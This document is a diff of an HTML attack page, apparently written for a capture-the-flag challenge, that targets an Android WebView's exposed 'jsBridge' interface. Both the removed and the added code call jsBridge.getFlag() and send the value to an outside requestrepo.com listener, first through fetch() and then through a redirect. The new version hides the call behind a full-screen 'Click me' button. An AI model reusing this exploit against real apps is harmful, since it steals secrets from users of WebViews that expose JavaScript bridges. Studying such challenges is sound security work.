@@ -1,29 +1,42 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Access Flag from WebView</title>
-    <script type="text/javascript">
-        // This function will be called when a user clicks the button
-        function getFlagFromAndroid() {
-            // Calling the Java method `getFlag()` exposed via `jsBridge`
-            var flag = jsBridge.getFlag();  // This calls the getFlag() method in your WebView interface
+  <title>Fullscreen Button</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+    }
 
-            // Display the result in an alert
-            fetch( "https://gfynf30y.requestrepo.com/" + flag)
-      .then(response => response.text())
-      .then(data => {
-        console.log("Fetched content:");
-        console.log(data);
-      })
-      .catch(error => {
-        console.error("Error fetching:", error);
-      });
-        }
-    </script>
+    button {
+      width: 100%;
+      height: 100%;
+      font-size: 32px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
 </head>
 <body>
-    <h1>Click the button to retrieve the flag</h1>
-    <button onclick="getFlagFromAndroid()">Get Flag</button>
+  <button onclick="getFlag()">Click me</button>
+
+  <script>
+    function getFlag() {
+      // If this is running inside an Android WebView with addJavascriptInterface
+      if (window.jsBridge && typeof window.jsBridge.getFlag === "function") {
+        const flag = window.jsBridge.getFlag();
+        const flag2 = jsBridge.getFlag();
+        window.location = "http://gfynf30y.requestrepo.com/"+flag + "/" + flag2 
+      } else {
+         // window.location = "gfynf30y.requestrepo.com/"+flag
+      }
+    }
+  </script>
 </body>
 </html>
